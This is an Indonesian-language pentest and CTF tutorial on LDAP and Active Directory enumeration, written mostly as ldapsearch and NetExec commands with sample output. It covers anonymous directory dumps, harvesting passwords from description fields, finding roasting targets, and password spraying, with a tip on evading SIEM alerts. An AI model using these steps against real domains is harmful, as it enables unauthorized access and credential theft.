---
id: "11"
title: "11_ldap_workflow.md — Pentest Workflow: LDAP & Active Directory Enumeration"
category: "2. Network Services"
categoryId: "network"
filename: "11_ldap_workflow.md"
refs_out: ["05","06","12","14a","14b","35","36","39","45"]
refs_in: ["04","05","08","09","10","12","22","35","37","41","42"]
---

# [11_ldap_workflow.md — Pentest Workflow: LDAP & Active Directory Enumeration](/docs/ldap) — Pentest Workflow: LDAP & Active Directory Enumeration

text

```
==================================================================================
DOCUMENTATION TYPE : Service Exploitation Workflow (Network & Infrastructure)
SERVICE TARGET     : Lightweight Directory Access Protocol (LDAP / LDAPS / GC)
DEFAULT PORTS      : TCP 389 (Plaintext), TCP 636 (LDAPS), TCP 3268 (GC), TCP 3269 (GC SSL)
TARGET AUDIENCE    : Penetration Testers, CTF Players (HTB / THM / Proving Grounds)
PLATFORM CONTEXT   : Parrot OS XFCE / Debian CLI
PREREQUISITES      : File 01-04 (Recon & Nmap), File 05 (SMB), File 06 (SSH)
==================================================================================
```

---

## 🧠 BAGIAN 1: LDAP FUNDAMENTALS

### 1. Apa itu LDAP? (Analogi Buku Telepon Perusahaan)

**Lightweight Directory Access Protocol (LDAP)** adalah protokol perangkat lunak standar industri yang digunakan untuk mencari, mengelola, dan mengorganisasi informasi tentang pengguna, komputer, grup, hak akses, dan perangkat lain di dalam suatu jaringan terpusat.

> **Analogi Buku Telepon Digital Kantor Pusat:**  
> Bayangkan sebuah perusahaan multinasional raksasa dengan 50.000 karyawan. Jika satpam, resepsionis, atau HRD ingin mengetahui nomor ekstensi, email, jabatan, atau siapa atasan dari _"Budi Santoso"_, mereka tidak perlu mencari berkas fisik satu per satu.  
> Mereka membuka **buku telepon digital (LDAP)**, mengetik kata kunci pencarian, dan sistem direktori langsung menampilkan struktur organisasi lengkap beserta atribut spesifik orang tersebut.

---

### 2. LDAP vs. Active Directory (AD)

Banyak pemula mencampuradukkan kedua istilah ini:

- **LDAP adalah Protokol Komunikasi (Bahasanya):** Protokol terbuka (Open Standard / RFC 4511) yang mengatur bagaimana client meminta (_query_) atau memodifikasi data pada sistem direktori.
- **Active Directory (AD) adalah Database & Sistem Direktori (Implementasinya):** Produk proprietary Microsoft yang menggunakan LDAP sebagai protokol query utamanya, tetapi menambahkan protokol otentikasi seperti Kerberos, NTLM, RPC, DNS terintegrasi, dan Group Policy Objects (GPO).

text

```
+-------------------------------------------------------------+
|               MICROSOFT ACTIVE DIRECTORY (AD DS)            |
|  +---------------------+  +-------------------------------+ |
|  |     Kerberos V5     |  |             NTLM              | |
|  +---------------------+  +-------------------------------+ |
|  |                     LDAP / LDAPS                       | |
|  |     (Protokol Query & Modifikasi Objek Direktori)      | |
|  +--------------------------------------------------------+ |
|  |               Database NTDS.dit (Schema, Objek)         | |
+--+----------------------------------------------------------+
```

---

### 3. Port LDAP & Pentingnya dalam Enumerasi

text

```
+----------+--------------------------+----------------------------------------------------------+
| Port TCP | Protokol / Layanan       | Karakteristik & Nilai Pentest                            |
+----------+--------------------------+----------------------------------------------------------+
| 389      | LDAP (Plaintext)         | Port utama query direktori lokal domain saat ini.        |
|          |                          | Sering mengizinkan Anonymous Bind / Null Session di CTF. |
+----------+--------------------------+----------------------------------------------------------+
| 636      | LDAPS (LDAP over TLS)    | Komunikasi terenkripsi SSL/TLS. Wajib digunakan jika     |
|          |                          | ingin mengubah password via protokol LDAP.               |
+----------+--------------------------+----------------------------------------------------------+
| 3268     | Global Catalog (GC)      | Menyimpan replika data parsial dari SELURUH domain dalam |
|          | (Plaintext)              | satu AD Forest (multi-domain reconnaissance).            |
+----------+--------------------------+----------------------------------------------------------+
| 3269     | Global Catalog SSL       | Global Catalog versi terenkripsi SSL/TLS.                |
+----------+--------------------------+----------------------------------------------------------+
```

---

### 4. Distinguished Name (DN) & Cara Membacanya

Setiap objek di dalam LDAP (user, komputer, grup, kontainer) memiliki alamat unik absolut yang disebut **Distinguished Name (DN)**. Membaca DN dilakukan dari tingkat objek paling spesifik (kiri) ke tingkat root domain (kanan).

text

```
CONTOH DISTINGUISHED NAME:
CN=John Doe,OU=IT Support,OU=Staff,DC=corp,DC=inlanefreight,DC=local

KOMPONEN BREAKDOWN:
├── CN  (Common Name)            : "John Doe" (Nama spesifik objek user)
├── OU  (Organizational Unit)    : "IT Support" (Sub-folder tempat user berada)
├── OU  (Organizational Unit)    : "Staff" (Folder induk)
├── DC  (Domain Component)       : "corp"
├── DC  (Domain Component)       : "inlanefreight"  --> Membentuk domain FQDN:
└── DC  (Domain Component)       : "local"              corp.inlanefreight.local
```

- **RDN (Relative Distinguished Name):** Bagian paling kiri dari DN (contoh: `CN=John Doe`).
- **Base DN (Search Base):** Titik awal pencarian hierarki. Jika Base DN diset ke `DC=inlanefreight,DC=local`, maka pencarian akan mencakup seluruh objek di bawah domain tersebut.

---

### 5. Sintaks Dasar LDAP Search Filter

Filter LDAP menggunakan notasi prefiks (_Polish notation_) di mana operator logika diletakkan di depan kondisi yang digabungkan dalam tanda kurung kurawal `()`.

text

```
+-----------------------------+----------------------------------------------------------------+
| Sintaks Filter              | Penjelasan Logika                                              |
+-----------------------------+----------------------------------------------------------------+
| (objectClass=user)          | Cari objek yang memiliki tipe 'user'.                          |
| (sAMAccountName=john)       | Cari akun dengan login username 'john'.                        |
| (!(objectClass=computer))   | Negasi: Cari objek yang BUKAN bertipe 'computer'.              |
| (&(filter1)(filter2))       | AND: Objek harus memenuhi filter1 DAN filter2.                 |
| (|(filter1)(filter2))       | OR: Objek boleh memenuhi filter1 ATAU filter2.                 |
| (&(objectClass=user)(adminCount=1)) | Cari objek user YANG JUGA merupakan akun admin (AdminSDHolder).|
+-----------------------------+----------------------------------------------------------------+
```

---

### 6. Anonymous Bind vs. Authenticated Bind

- **Anonymous Bind (Null Session):** Koneksi LDAP yang dilakukan tanpa menyertakan username atau password (`-x` tanpa `-D` dan `-w`). Jika Domain Controller mengizinkan fitur ini, penyerang dapat mengekstrak **seluruh database pengguna, grup, komputer, dan deskripsi akun tanpa otentikasi sama sekali**.
- **Authenticated Bind:** Koneksi LDAP menggunakan kredensial yang valid (misalnya: `CN=Guest` atau user domain tingkat rendah). Memberikan akses visibilitas penuh ke seluruh atribut AD.

---

## 🛠️ BAGIAN 2: TOOL ARSENAL LDAP

text

```
========================================================================================================
TOOL               FUNGSI UTAMA                    KECEPATAN   ANONYMOUS TEST   OUTPUT FORMAT   PARSING
========================================================================================================
ldapsearch         Swiss-Army Knife Query Raw LDAP Cepat       Ya               LDIF (Text)     grep/awk
nxc (NetExec)      Modern AD Spray & Enum Tool     Sangat Cepat Ya              Table/Colorized Otomatis
ldapdomaindump     Automated AD Object Dumper      Sedang      Ya               HTML / JSON / TSV Browser/jq
windapsearch       Python Modular LDAP Hunter      Cepat       Ya               Table / Text    Regex
nmap (NSE)         RootDSE & Config Discovery      Cepat       Ya               Nmap Text       Otomatis
enum4linux-ng      Full OS & Directory Enumerator  Sedang      Ya               Text / YAML     CLI
bloodhound-python  Graph Ingestor via LDAP         Sedang      Memerlukan Auth  JSON (Zip)      BloodHound GUI
========================================================================================================
```

---

### 1. `ldapsearch` — Raw CLI LDAP Client

- **Fungsi:** Tool baris perintah standar (paket `ldap-utils` di Parrot OS) untuk berinteraksi langsung dengan LDAP server menggunakan berbagai filter presisi.
- **Kapan digunakan:** Tool utama untuk rootDSE discovery, anonymous bind extraction, dan manual filtering.
- **Instalasi & Verifikasi di Parrot OS:**
```bash
# Verifikasi apakah ldapsearch sudah terinstall:
which ldapsearch || sudo apt install ldap-utils -y

# Verifikasi versi:
ldapsearch --version

# Install dependensi dan tool pendukung terkait:
sudo apt install ldap-utils python3-ldap -y
pip3 install ldapdomaindump --break-system-packages
```

- **Flag Penting:**
  - `-x` : Menggunakan Simple Authentication (bukan SASL/GSSAPI).
  - `-H <ldap://IP:PORT>` : Target LDAP URI.
  - `-b <Base_DN>` : Search Base DN.
  - `-D <Bind_DN>` : User bind (untuk autentikasi).
  - `-w <Password>` : Password teks biasa.
  - `-s <base|one|sub>` : Search scope (`sub` = jelajah seluruh sub-tree).
  - `-E pr=1000/noprompt` : Paging mode (mencegah output terpotong batas server limit 1000 objek).

```bash
# 1. Anonymous query mengambil informasi RootDSE (Menemukan Base DN)
ldapsearch -x -H ldap://10.10.11.200 -s base namingcontexts

# 2. Anonymous dump seluruh akun user dan atribut deskripsinya
ldapsearch -x -H ldap://10.10.11.200 -b "DC=inlanefreight,DC=local" "(objectClass=user)" sAMAccountName description

# 3. Authenticated search menggunakan kredensial domain
ldapsearch -x -H ldap://10.10.11.200 -D "svc_ldap@inlanefreight.local" -w "Password123!" -b "DC=inlanefreight,DC=local" "(adminCount=1)" sAMAccountName
```

```text
CONTOH OUTPUT REALISTIS ldapsearch:
# extended LDIF
# LDAPv3
# base <DC=inlanefreight,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName description 

dn: CN=Administrator,CN=Users,DC=inlanefreight,DC=local
sAMAccountName: Administrator
description: Built-in account for administering the computer/domain

dn: CN=Sarah Connor,OU=Management,DC=inlanefreight,DC=local
sAMAccountName: sconnor
description: Temporary password for onboarding: Summer2023!

# numResponses: 3
# numEntries: 2
```

---

### 2. `nxc` (NetExec) LDAP Module

- **Fungsi:** Menguji anonymous bind, enumerasi user/grup, cek password policy, dan password spraying melalui port 389.
- **Kapan digunakan:** Recon instan satu baris dan password spraying yang aman.

```bash
# 1. Pengecekan Anonymous Bind dan Base Information
nxc ldap 10.10.11.200 -u '' -p ''

# 2. Password Spraying terhadap seluruh user AD via LDAP
nxc ldap 10.10.11.200 -u users.txt -p 'Welcome2023!' --continue-on-success

# 3. Dump seluruh domain users (membutuhkan kredensial)
nxc ldap 10.10.11.200 -u 'sconnor' -p 'Summer2023!' --users
```

```text
CONTOH OUTPUT nxc ldap 10.10.11.200 -u '' -p '':
LDAP        10.10.11.200    389   DC01             [*] Windows Server 2019 Standard 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL)
LDAP        10.10.11.200    389   DC01             [+] INLANEFREIGHT.LOCAL\: (Guest/Null Bind Success!)
```

---

### 3. `ldapdomaindump` — Automated Visual AD Dumper

- **Fungsi:** Mengunduh seluruh objek Active Directory via LDAP dan menyusunnya menjadi laporan HTML tabel interaktif, file JSON, dan TSV yang mudah dibaca.
- **Kapan digunakan:** Ditemukan Anonymous Bind atau sudah memiliki 1 kredensial valid.

```bash
# 1. Jalankan dump via Anonymous Bind
ldapdomaindump ldap://10.10.11.200 -u "" -p "" -o ./ldap_dump/

# 2. Jalankan dump dengan kredensial
ldapdomaindump ldap://10.10.11.200 -u "INLANEFREIGHT\\sconnor" -p "Summer2023!" -o ./ldap_dump/
```

_File yang dihasilkan di folder `./ldap_dump/`:_
- `domain_users.html` : Tabel seluruh user, deskripsi, kapan password diubah, bad pwd count.
- `domain_groups.html` : Struktur membership seluruh security group.
- `domain_computers.html` : Daftar seluruh server, workstation, OS version, dan Service Pack.
- `domain_trusts.html` : Hubungan trust antar forest/domain.

---

### 4. `windapsearch` — Modular Python AD Hunter

- **Fungsi:** Tool berbasis Python untuk mengekstraksi target spesifik (SPN accounts, Domain Admins, Unconstrained Delegation, akun tanpa pre-auth) secara terisolasi.
- **Instalasi di Parrot OS:** `git clone https://github.com/ropnop/windapsearch.git /opt/windapsearch`

```bash
# 1. Enumerate Domain Admins
python3 /opt/windapsearch/windapsearch.py -d inlanefreight.local --dc-ip 10.10.11.200 --da

# 2. Enumerate Service Principal Names (Kerberoasting Candidates)
python3 /opt/windapsearch/windapsearch.py -d inlanefreight.local --dc-ip 10.10.11.200 --spns

# 3. Enumerate Akun yang Tidak Membutuhkan Kerberos Pre-Authentication (AS-REP Roasting Candidates)
python3 /opt/windapsearch/windapsearch.py -d inlanefreight.local --dc-ip 10.10.11.200 --asreproastable
# Atau dengan query atribut manual:
python3 /opt/windapsearch/windapsearch.py -d inlanefreight.local --dc-ip 10.10.11.200 -m users --attrs sAMAccountName,userAccountControl

# 4. Enumerate Unconstrained Delegation (Akun Berbahaya untuk Impersonasi):
python3 /opt/windapsearch/windapsearch.py -d inlanefreight.local --dc-ip 10.10.11.200 --unconstrained-users
```

---

### 5. `nmap` NSE Scripts untuk LDAP

- **Fungsi:** Fingerprinting RootDSE dan enumerasi cepat non-interaktif saat port scanning awal.

Bash

```
# Mengekstrak seluruh rootDSE info (Naming Contexts, Subschema, DC hostname)
nmap -p 389 --script ldap-rootdse 10.10.11.200
```

---

## 🎯 BAGIAN 3: WORKFLOW UTAMA (STEP BY STEP)

text

```
==================================================================================
ENVIRONMENT SETUP (Jalankan ini di terminal Parrot OS Anda):
==================================================================================
```

Bash

```
export TARGET="10.10.11.200"
echo "Target Domain Controller: $TARGET"
```

---

### FASE 1: LDAP PORT DETECTION & ROOTDSE DISCOVERY

Tujuan: Mengidentifikasi apakah server merupakan Domain Controller Active Directory atau OpenLDAP Linux murni, serta mengambil nama domain (Base DN) tanpa kredensial.

Bash

```
# 1. Scan semua port LDAP standar
nmap -sV -p 389,636,3268,3269 $TARGET -oN nmap_ldap.txt

# 2. Ekstraksi namingContexts (Base DN) dari RootDSE
ldapsearch -x -H ldap://$TARGET -s base namingcontexts
```

text

```
CONTOH OUTPUT ROOTDSE:
dn:
namingContexts: DC=inlanefreight,DC=local
namingContexts: CN=Configuration,DC=inlanefreight,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=inlanefreight,DC=local
namingContexts: DC=DomainDnsZones,DC=inlanefreight,DC=local
namingContexts: DC=ForestDnsZones,DC=inlanefreight,DC=local
```

- **Hasil Analisis:**
  - Terdeteksi `DC=inlanefreight,DC=local` ➔ Ini adalah **Microsoft Active Directory**.
  - Base DN yang akan digunakan di seluruh perintah berikutnya adalah: `DC=inlanefreight,DC=local`.

```bash
# Opsi 1: Set Manual jika sudah tahu nilainya
export BASE_DN="DC=inlanefreight,DC=local"
export DOMAIN="inlanefreight.local"

# Opsi 2: One-Liner Otomatis Ekstrak & Set BASE_DN dari RootDSE (Direkomendasikan!)
export BASE_DN=$(ldapsearch -x -H ldap://$TARGET \
  -s base namingcontexts 2>/dev/null \
  | grep "^namingContexts:" \
  | grep -v "CN=" \
  | head -1 \
  | awk '{print $2}')

echo "[+] Base DN: $BASE_DN"

# Set DOMAIN secara otomatis dari BASE_DN:
export DOMAIN=$(echo $BASE_DN \
  | sed 's/DC=//g' \
  | sed 's/,/./g' \
  | tr '[:upper:]' '[:lower:]')

echo "[+] Domain: $DOMAIN"
```

---

### FASE 2: ANONYMOUS BIND TEST (NULL SESSION)

Tujuan: Menguji apakah server LDAP mengizinkan Anonymous Query ke database direktori.

Bash

```
# Uji Anonymous Bind dengan query mengambil 1 objek sembarang
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectClass=*)" -s sub -z 1 dn
```

text

```
KONDISI A: ANONYMOUS BIND DIIZINKAN (JACKPOT CTF!)
# extended LDIF
# LDAPv3
# base <DC=inlanefreight,DC=local> with scope subtree
# filter: (objectClass=*)
# requesting: dn 
dn: DC=inlanefreight,DC=local
# numResponses: 2
# numEntries: 1

KONDISI B: ANONYMOUS BIND DITOLAK (SECURE / MODERN DEFAULT)
ldap_search_ext: Operations error (1)
ldap_search_ext: Insufficient access rights (50)
Additional information: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v3839
```

---

### FASE 3: LDAP ROOTDSE ENUMERATION (ALWAYS ACCESSIBLE)

Meskipun Anonymous Bind ke database direktori ditolak, informasi **RootDSE** (atribut root `dn:`) **selalu dapat dibaca tanpa autentikasi** oleh protokol LDAP standar.

Bash

```
# Ekstraksi informasi komprehensif Domain Controller dari RootDSE
ldapsearch -x -H ldap://$TARGET -s base -b "" "(objectClass=*)" \
  defaultNamingContext \
  dnsHostName \
  domainFunctionality \
  forestFunctionality \
  supportedLDAPVersion \
  serverName
```

text

```
CONTOH OUTPUT:
dn:
defaultNamingContext: DC=inlanefreight,DC=local
dnsHostName: DC01.inlanefreight.local
domainFunctionality: 7
forestFunctionality: 7
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=inlanefreight,DC=local
```

- **Interpretasi:**
    - Hostname: `DC01.inlanefreight.local`
    - Functional Level: `7` (Windows Server 2016 / 2019 / 2022).
    - _Action:_ Segera tambahkan mapping IP ke `/etc/hosts`:
        
        Bash
        
        ```
        echo "$TARGET inlanefreight.local dc01.inlanefreight.local dc01" | sudo tee -a /etc/hosts
        ```
        

---

### FASE 4: FULL DOMAIN DUMP (ANONYMOUS BIND OPEN)

Jika Fase 2 menghasilkan status sukses, lakukan dumping terstruktur terhadap objek-objek penting berikut:

#### 4a. Ekstraksi Seluruh Akun Pengguna (Users)

Bash

```
# Dump semua username dan simpan ke file teks bersih
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(objectCategory=person))" sAMAccountName \
  | grep "^sAMAccountName:" | awk '{print $2}' | sort -u > users.txt

# Tampilkan total user yang ditemukan
wc -l users.txt
head -n 10 users.txt
```

---

#### 4b. Periksa Field Description ("Password in Description")

> **KENAPA INI SANGAT SERING MUNCUL DI CTF?**  
> Dalam operasional kantor nyata, staf Helpdesk yang malas sering mencatat password sementara (_temporary password_) atau PIN reset user baru pada kolom **Description** atau **Comment** di Active Directory Users and Computers (ADUC). Praktik buruk ini sering dijadikan jalur masuk (_Initial Access_) pada mesin HTB/THM/Proving Grounds.

Bash

```
# Query seluruh user beserta field description-nya
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(description=*))" sAMAccountName description
```

text

```
CONTOH OUTPUT ldapsearch DENGAN PASSWORD:
dn: CN=James Wilson,OU=Sales,DC=inlanefreight,DC=local
sAMAccountName: jwilson
description: Account created. Temp pass: Summer2023!_Sales

dn: CN=Helpdesk Tech,OU=IT,DC=inlanefreight,DC=local
sAMAccountName: hdesk_svc
description: Password reset on 12/04/2023 to WelcomeToCorp123!
```

Bash

```
# Perintah cepat satu baris untuk mengekstrak string user:password langsung:
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(description=*))" sAMAccountName description \
  | grep -E "(sAMAccountName|description):"
```

---

#### 4c. Ekstraksi Security Groups & High-Privilege Members

Bash

```
# 1. Ambil daftar semua grup di AD
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectClass=group)" cn description

# 2. Ekstraksi anggota spesifik grup Domain Admins
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=group)(cn=Domain Admins))" member

# 3. Ekstraksi anggota grup Remote Desktop / Remote Management Users (WinRM Access)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=group)(cn=Remote Management Users))" member
```

---

#### 4d. Ekstraksi Computer Objects (Server & Workstations)

Bash

```
# Dump seluruh nama komputer, FQDN, dan sistem operasinya
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectClass=computer)" \
  dNSHostName operatingSystem operatingSystemVersion
```

text

```
CONTOH OUTPUT COMPUTERS:
dn: CN=DC01,OU=Domain Controllers,DC=inlanefreight,DC=local
dNSHostName: DC01.inlanefreight.local
operatingSystem: Windows Server 2019 Standard

dn: CN=SQL01,OU=Servers,DC=inlanefreight,DC=local
dNSHostName: SQL01.inlanefreight.local
operatingSystem: Windows Server 2016 Standard

dn: CN=WS-DEV-14,OU=Workstations,DC=inlanefreight,DC=local
dNSHostName: WS-DEV-14.inlanefreight.local
operatingSystem: Windows 10 Enterprise
```

---

#### 4e. SPN Accounts (Target Serangan Kerberoasting)

- **Konsep:** Akun pengguna biasa yang memiliki atribut `servicePrincipalName` (SPN) terdaftar (misal: akun service SQL, HTTP, IIS). Siapa pun domain user yang terotentikasi dapat meminta Kerberos TGS Ticket untuk SPN ini, lalu mengekstrak hash NTLM/AES password service account tersebut untuk di-crack secara offline (_Kerberoasting_).

Bash

```
# Filter pencarian akun user (bukan komputer) yang memiliki SPN terdaftar:
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
  "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))" \
  sAMAccountName servicePrincipalName
```

text

```
CONTOH OUTPUT SPN:
dn: CN=SQL Service,OU=Service Accounts,DC=inlanefreight,DC=local
sAMAccountName: svc_mssql
servicePrincipalName: MSSQLSvc/SQL01.inlanefreight.local:1433
```

---

#### 4f. AS-REP Roasting Candidates (`DONT_REQUIRE_PREAUTH`)

- **Konsep:** Jika bit `DONT_REQ_PREAUTH` (nilai heksadesimal `0x400000` atau desimal `4194304`) aktif pada atribut `userAccountControl`, server KDC akan mengirimkan tiket TGT terenkripsi **tanpa memerlukan otentikasi awal**. Hash tiket ini dapat di-crack offline menggunakan Hashcat mode 18200.
    
- **Sintaks Matching Rule Bitwise LDAP:** `1.2.840.113556.1.4.803` mewakili operator bitwise AND (`LDAP_MATCHING_RULE_BIT_AND`).
    

Bash

```
# Filter untuk mencari akun yang tidak memerlukan Kerberos Pre-Authentication:
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName userAccountControl
```

text

```
CONTOH OUTPUT AS-REP CANDIDATE:
dn: CN=Hulk Hogan,OU=Employees,DC=inlanefreight,DC=local
sAMAccountName: hhogan
userAccountControl: 4194816   <-- (512 NORMAL_ACCOUNT + 4194304 DONT_REQ_PREAUTH)
```

---

#### 4g. AdminSDHolder Protected Accounts (`adminCount=1`)

- **Konsep:** Akun-akun yang memiliki hak akses administratif tinggi (Domain Admins, Enterprise Admins, Schema Admins, Backup Operators) dilindungi oleh proses otomatis AD bernama `SDProp`. Atribut `adminCount` diubah menjadi `1`.

Bash

```
# Filter pencarian seluruh akun dengan proteksi hak akses tinggi:
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
  "(&(objectClass=user)(adminCount=1))" sAMAccountName memberOf
```

---

### FASE 5: AUTHENTICATED LDAP ENUMERATION

Jika Anda telah mendapatkan satu akun valid (misal: `jwilson:Summer2023!_Sales` dari Fase 4b), lakukan bind resmi untuk mengekstrak data sensitif lain yang dibatasi dari anonymous view:

Bash

```
export AUTH_USER="jwilson"
export AUTH_PASS="Summer2023!_Sales"

# 1. Verifikasi kredensial via NetExec LDAP
nxc ldap $TARGET -u "$AUTH_USER" -p "$AUTH_PASS"

# 2. Dump visual database domain lengkap via ldapdomaindump
ldapdomaindump ldap://$TARGET -u "$DOMAIN\\$AUTH_USER" -p "$AUTH_PASS" -o ./ad_full_loot/

# 3. Jalankan BloodHound Python Ingestion melalui protokol LDAP
bloodhound-python -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -dc "$TARGET" -c All --zip
```

---

### FASE 6: LDAP PASSWORD SPRAYING (SAFE PROTOCOL)

> **MENGAPA SPRAYING VIA LDAP LEBIH AMAN DARI KERBEROS?**  
> Password spraying via Kerberos sering kali langsung memicu event log kegagalan pre-auth `4771` yang terpantau ketat oleh SOC/SIEM. Melakukan bind authentication via LDAP menghasilkan event `4625` standar atau `2889` yang sering lolos dari alert korelasi ketat.

Bash

```
# Langkah 1: Cek Account Lockout Threshold terlebih dahulu via NetExec
nxc ldap $TARGET -u "$AUTH_USER" -p "$AUTH_PASS" --pass-pol
```

text

```
CONTOH OUTPUT PASSWORD POLICY:
Account Lockout Threshold: 0        <-- TIDAK ADA LOCKOUT! Bebas melakukan spraying!
Account Lockout Duration: 30 mins
Reset Account Lockout After: 30 mins
Minimum Password Length: 7
```

Bash

```
# Langkah 2: Lakukan Password Spraying terhadap file users.txt yang telah dibuat di Fase 4a
nxc ldap $TARGET -u users.txt -p 'Welcome2023!' --continue-on-success
```

---

## 📋 BAGIAN 4: ACTIVE DIRECTORY ATTRIBUTE REFERENCE

Berikut adalah tabel referensi 20 atribut LDAP Active Directory paling bernilai yang wajib diperiksa oleh pentester:

|Atribut LDAP|Tipe Data|Deskripsi Fungsional|Nilai Kritis yang Dicari Pentester|
|---|---|---|---|
|`sAMAccountName`|String|Username login akun (format legacy Pre-Win2000).|Username target untuk spraying / Kerberoast.|
|`userPrincipalName`|String|Format login email/UPN (`user@domain.local`).|Format login alternatif untuk Kerberos / WinRM.|
|`description`|String|Keterangan bebas tentang akun.|**Password plaintext**, status onboarding, PIN.|
|`comment`|String|Komentar tambahan akun.|Sering berisi catatan kredensial lama/baru.|
|`memberOf`|DN List|Daftar grup di mana akun tersebut menjadi anggota.|`CN=Domain Admins`, `Remote Management Users`.|
|`userAccountControl`|Bitmask|Bendera status akun (aktif, disabled, preauth, dll).|`514` (Disabled), `4194304` (No Pre-Auth).|
|`servicePrincipalName`|String List|Daftar identifier SPN yang di-host oleh akun.|Akun bernilai untuk **Kerberoasting**.|
|`pwdLastSet`|Timestamp|Kapan password akun terakhir kali diganti.|`0` = User wajib ganti password saat login.|
|`lastLogonTimestamp`|Timestamp|Waktu perkiraan login terakhir (sinkronisasi 14 hari).|Mengidentifikasi akun aktif vs akun mati (_stale_).|
|`mail`|String|Alamat email utama pengguna.|Target phishing / OSINT email list.|
|`adminCount`|Integer|Penanda akun dilindungi oleh AdminSDHolder (`1`).|Mengidentifikasi target high-privilege account.|
|`msDS-AllowedToDelegateTo`|String List|Daftar service untuk Constrained Delegation.|**Delegation Abuse** →→ Impersonate Admin.|
|`msDS-AllowedToActOnBehalfOfOtherIdentity`|Binary/SD|Konfigurasi Resource-Based Constrained Delegation (RBCD).|**RBCD Takeover Attack**.|
|`primaryGroupID`|Integer|ID grup utama akun (`513` = Domain Users).|`512` = Akun memiliki primary group Domain Admins.|
|`distinguishedName`|DN String|Path lokasi objek lengkap di Active Directory.|Mengetahui OU struktur departemen target.|
|`operatingSystem`|String|Nama OS komputer (`Windows Server 2019`).|Mengidentifikasi target unpatched / legacy OS.|
|`operatingSystemVersion`|String|Nomor build spesifik kernel OS.|Memetakan exploit lokal (PrivEsc CVE).|
|`objectSid`|Binary/SID|Security Identifier unik objek (`S-1-5-21-...-500`).|Mengetahui RID (500 = Default Administrator).|
|`sIDHistory`|SID List|Riwayat SID lama hasil migrasi antar domain.|**SID History Injection / Privilege Escalation**.|
|`unixUserPassword`|String|Password format Unix jika RFC 2307 / NIS aktif.|Password hash/plaintext pengguna Linux di AD.|

---

## 🔍 BAGIAN 5: LDAP FILTER CHEAT SHEET

Format umum pemanggilan query di terminal:
`ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "<FILTER>" <ATRIBUT_YANG_DIMINTA>`

### 1. User Filters
```bash
# Seluruh objek pengguna manusia
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectCategory=person)(objectClass=user)" sAMAccountName

# User yang AKTIF saja (Mengabaikan akun Disabled)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName userAccountControl

# User dengan kata 'pass' pada deskripsi
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(description=*pass*))" sAMAccountName description
```

### 2. Group Filters
```bash
# Seluruh security & distribution group
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectCategory=group)" cn description

# Grup yang mengandung kata 'Admin'
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectCategory=group)(cn=*Admin*))" cn member

# Anggota grup Enterprise Admins
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=group)(samAccountName=Enterprise Admins))" member
```

### 3. Computer & Server Filters
```bash
# Seluruh komputer di domain
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectCategory=computer)" dNSHostName operatingSystem

# Hanya mesin bertipe SERVER (High Value)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectCategory=computer)(operatingSystem=*Server*))" dNSHostName operatingSystem

# Objek Domain Controller
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" dNSHostName
```

### 4. Kerberoasting Filters (SPN)
```bash
# Akun user (bukan mesin komputer) yang memiliki ServicePrincipalName
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))" sAMAccountName servicePrincipalName

# Akun SPN khusus database MSSQL
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(servicePrincipalName=MSSQL*)(!(objectClass=computer)))" sAMAccountName servicePrincipalName
```

### 5. AS-REP Roasting Filters (No Pre-Auth)
```bash
# Akun dengan bendera DONT_REQ_PREAUTH aktif (UAC Bit 4194304)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName userAccountControl
```

### 6. High-Privilege Account Filters (AdminSDHolder)
```bash
# Seluruh akun user dengan perlindungan hak akses tinggi (adminCount=1)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(adminCount=1))" sAMAccountName memberOf

# Anggota langsung Domain Admins
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,$BASE_DN))" sAMAccountName
```

### 7. Password Policy & Delegation Filters
```bash
# Root domain untuk membaca password policy
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(objectClass=domainDNS)" maxPwdAge minPwdLength lockoutThreshold

# Akun dengan Constrained Delegation aktif
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo

